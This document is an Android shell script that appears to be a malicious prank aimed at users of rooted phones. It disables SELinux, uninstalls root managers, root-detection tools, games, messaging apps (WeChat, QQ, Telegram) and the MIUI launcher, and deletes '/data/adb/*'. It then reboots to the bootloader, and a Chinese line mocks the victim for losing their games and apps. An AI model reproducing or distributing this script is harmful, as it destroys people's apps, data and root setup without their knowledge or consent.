setenforce 0
pm uninstall com.topjohnwu.magisk
pm uninstall io.github.vvb2060.magisk
pm uninstall io.github.huskydg.magisk
pm uninstall me.weishu.kernelsu
pm uninstall me.bmax.apatch
pm uninstall com.android.patch
pm uninstall com.tsng.hidemyapplist
pm uninstall com.tsng.dyhhvf
pm uninstall com.tsng.guojiancebaod
pm uninstall icu.nullptr.nativetest
pm uninstall com.zhenxi.hunter
pm uninstall io.github.vvb2060.keyattestation
pm uninstall io.github.vvb2060.mahoshojo
pm uninstall io.github.huskydg.memorydetector
pm uninstall com.byxiaorun.detector
pm uninstall icu.nullptr.applistdetector
pm uninstall rikka.safetynetchecker
pm uninstall gr.nikolasspyr.integritycheck
pm uninstall com.henrikherzig.playintegritychecker
pm uninstall com.miHoYo.Yuanshen
pm uninstall com.miHoYo.hkrpg
pm uninstall com.tencent.tmgp.sgame
pm uninstall com.tencent.tmgp.pubgmhd
pm uninstall com.tencent.ig
pm uninstall com.tencent.lolm
pm uninstall com.ss.android.ugc.aweme
pm uninstall com.miui.home
pm uninstall com.tencent.tmgp.cf
pm uninstall com.jiaohua_browser
pm uninstall bin.mt.plus
pm uninstall com.proximabeta.mf.uamo
pm uninstall com.tencent.mobileqq
pm uninstall com.tencent.mm
pm uninstall org.telegram.messenger.web
pm uninstall tv.danmaku.bili
pm uninstall com.ss.android.ugc.aweme
rm -rf /data/adb/*
sleep 4s
setenforce 1
笑死了小伙子，本sh不会格机删分区，但是你的游戏和应用怎么办呢？🤔
重启到bootloader
reboot bootloader